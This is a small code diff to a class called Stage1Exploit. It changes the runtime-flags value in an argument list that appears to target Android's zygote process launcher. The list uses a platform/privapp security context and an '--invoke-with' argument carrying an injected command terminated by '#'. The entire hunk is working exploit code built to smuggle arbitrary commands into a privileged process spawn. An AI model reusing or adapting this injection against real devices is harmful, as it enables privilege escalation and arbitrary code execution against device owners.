@@ -198,7 +198,7 @@ class Stage1Exploit:
             "--nice-name=shell",
             "--mount-external-default",
             "--seinfo=platform:privapp:complete",
-            "--runtime-flags=2049",
+            "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
         ]
